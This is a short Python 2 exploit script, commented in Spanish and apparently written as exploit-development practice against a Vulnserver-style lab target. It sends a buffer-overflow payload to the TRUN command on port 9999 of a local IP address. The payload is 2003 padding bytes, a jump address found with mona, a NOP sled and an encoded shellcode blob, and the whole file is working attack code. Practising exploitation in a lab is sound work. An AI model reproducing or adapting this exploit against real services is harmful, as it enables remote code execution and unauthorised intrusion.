#!/usr/bin/python
import sys, socket

#probando el primer registro de memoria obtenido con mona
#625011af
#se agrega el valor al reves debido a la arquitectura x86
#esta guarda el valor menor en la address menor y el valor mayor 
#en el addres mayor

overflow = (
"\xbe\x79\xae\x83\xd9\xdb\xc6\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x83\xed\xfc\x31\x75\x0e\x03\x0c\xa0\x61\x2c\x12\x54\xe7"
"\xcf\xea\xa5\x88\x46\x0f\x94\x88\x3d\x44\x87\x38\x35\x08\x24"
"\xb2\x1b\xb8\xbf\xb6\xb3\xcf\x08\x7c\xe2\xfe\x89\x2d\xd6\x61"
"\x0a\x2c\x0b\x41\x33\xff\x5e\x80\x74\xe2\x93\xd0\x2d\x68\x01"
"\xc4\x5a\x24\x9a\x6f\x10\xa8\x9a\x8c\xe1\xcb\x8b\x03\x79\x92"
"\x0b\xa2\xae\xae\x05\xbc\xb3\x8b\xdc\x37\x07\x67\xdf\x91\x59"
"\x88\x4c\xdc\x55\x7b\x8c\x19\x51\x64\xfb\x53\xa1\x19\xfc\xa0"
"\xdb\xc5\x89\x32\x7b\x8d\x2a\x9e\x7d\x42\xac\x55\x71\x2f\xba"
"\x31\x96\xae\x6f\x4a\xa2\x3b\x8e\x9c\x22\x7f\xb5\x38\x6e\xdb"
"\xd4\x19\xca\x8a\xe9\x79\xb5\x73\x4c\xf2\x58\x67\xfd\x59\x35"
"\x44\xcc\x61\xc5\xc2\x47\x12\xf7\x4d\xfc\xbc\xbb\x06\xda\x3b"
"\xbb\x3c\x9a\xd3\x42\xbf\xdb\xfa\x80\xeb\x8b\x94\x21\x94\x47"
"\x64\xcd\x41\xc7\x34\x61\x3a\xa8\xe4\xc1\xea\x40\xee\xcd\xd5"
"\x71\x11\x04\x7e\x1b\xe8\xcf\x41\x74\xf3\x1a\x2a\x87\xf3\x35"
"\xf6\x0e\x15\x5f\x16\x47\x8e\xc8\x8f\xc2\x44\x68\x4f\xd9\x21"
"\xaa\xdb\xee\xd6\x65\x2c\x9a\xc4\x12\xdc\xd1\xb6\xb5\xe3\xcf"
"\xde\x5a\x71\x94\x1e\x14\x6a\x03\x49\x71\x5c\x5a\x1f\x6f\xc7"
"\xf4\x3d\x72\x91\x3f\x85\xa9\x62\xc1\x04\x3f\xde\xe5\x16\xf9"
"\xdf\xa1\x42\x55\xb6\x7f\x3c\x13\x60\xce\x96\xcd\xdf\x98\x7e"
"\x8b\x13\x1b\xf8\x94\x79\xed\xe4\x25\xd4\xa8\x1b\x89\xb0\x3c"
"\x64\xf7\x20\xc2\xbf\xb3\x41\x21\x15\xce\xe9\xfc\xfc\x73\x74"
"\xff\x2b\xb7\x81\x7c\xd9\x48\x76\x9c\xa8\x4d\x32\x1a\x41\x3c"
"\x2b\xcf\x65\x93\x4c\xda"
)

"""
A = IP ADDRESS
2003 = 2003 BYTES
xaf x11... = pointer address (jump)
x90 * 32 = the NOP sled
overflow = estructura del overflow
noobs = pathing (add path) entre el overflow y el resto de la cadena
"""

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.24',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()
